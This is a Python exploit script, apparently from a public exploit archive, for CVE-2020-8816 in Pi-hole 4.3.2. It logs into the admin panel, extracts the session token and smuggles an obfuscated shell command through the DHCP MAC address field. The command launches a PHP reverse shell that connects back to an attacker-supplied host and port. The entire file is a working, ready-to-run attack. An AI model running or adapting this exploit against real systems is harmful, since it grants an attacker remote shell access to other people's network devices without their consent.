#!/usr/bin/env python2

# Exploit Title: Pi-hole 4.3.2 - Remote Code Execution (Authenticated)
# Date: 2020-08-04
# Exploit Author: Luis Vacas @CyberVaca
# Vendor Homepage: https://pi-hole.net/
# Software Link: https://github.com/pi-hole/pi-hole
# Version: >= 4.3.2
# Tested on: Ubuntu 19.10
# CVE : CVE-2020-8816
# Twitter: https://twitter.com/cybervaca_

import requests
import argparse
import base64

class Color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def informa(msg):
    print (Color.GREEN + "[" + Color.RED + "+" + Color.GREEN + "] " +  msg )

def get_args():
    parser = argparse.ArgumentParser(description='CVE-2020-8816 Pi-hole RCE authenticated by @CyberVaca_')
    parser.add_argument('-u', dest='url', type=str, required=True, help="URL Target")
    parser.add_argument('-p', dest='port', type=str, required=True, help="LPORT")
    parser.add_argument('-i', dest='ip', type=str, required=True, help='LHOST')
    parser.add_argument('-pass', dest='password', type=str, required=True, help='Password')
    return parser.parse_args()

banner = base64.b64decode("4pWU4pWQ4pWX4pSsIOKUrOKUjOKUkOKUjCAg4pWU4pWQ4pWX4pSs4pSsIOKUrOKUjOKUgOKUkOKUrCAg4pSM4pSA4pSQCuKVoOKVkOKVneKUguKUguKUguKUguKUguKUgiAg4pWg4pWQ4pWd4pSC4pSc4pSA4pSk4pSCIOKUguKUgiAg4pSc4pSkCuKVqSAg4pSU4pS04pSY4pSY4pSU4pSYICDilakgIOKUtOKUtCDilLTilJTilIDilJjilLTilIDilJjilJTilIDilJgKICAgICAgYnkgQEN5YmVyVmFjYQo=")


def login(url,password):
	session = requests.Session()
	paramsGet = {"login":""}
	paramsPost = {"pw":password}
	headers = {"Origin":url,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Connection":"close","Referer":url + "/admin/index.php?login","Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}
	cookies = {"PHPSESSID":"cabesha"}
	response = session.post(url + "/admin/index.php", data=paramsPost, params=paramsGet, headers=headers, cookies=cookies, allow_redirects=False)
        token = response.content.split("<!-- Send token to JS -->")[0].split("<!-- /JS Warning -->")[1].split('</div><script src="scripts/pi-hole/js/header.js"></script>')[0].split("<div id='token' hidden>")[1]
        return token

def shell_reverse(url,token,payload):
	session = requests.Session()
	paramsGet = {"tab":"piholedhcp"}
	paramsPost = {"AddMAC":"aaaaaaaaaaaa&&W=\x24{PATH\x23/???/}&&P=\x24{W%%?????:*}&&X=\x24{PATH\x23/???/??}&&H=\x24{X%%???:*}&&Z=\x24{PATH\x23*:/??}&&R=\x24{Z%%/*}&&\x24P\x24H\x24P\x24IFS-\x24R\x24IFS'EXEC(HEX2BIN(\"" + str(payload).upper() + "\"));'&&","field":"DHCP","AddIP":"192.168.1.0","AddHostname":"192.168.1.23","addstatic":"","token":token}
	headers = {"Origin":url,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Connection":"close","Referer":"http://172.31.11.3/admin/settings.php?tab=piholedhcp","Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}
	cookies = {"PHPSESSID":"cabesha"}
	response = session.post(url + "/admin/settings.php", data=paramsPost, params=paramsGet, headers=headers, cookies=cookies)

def generate_shell(ip,port):
    payload = "php -r '$sock=fsockopen(\"LHOST\", LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'".replace("LHOST",ip).replace("LPORT",port)
    informa("Payload: " + Color.END + payload)
    payload = payload.encode("hex")
    return payload

if __name__ == '__main__':
    print(Color.RED + banner + Color.END)
    args = get_args()
    token = login(args.url,args.password)
    informa("Token: " + Color.END + token)
    payload = generate_shell(args.ip,args.port)
    informa("Sending Payload..." + Color.END)
    shell_reverse(args.url,token,payload)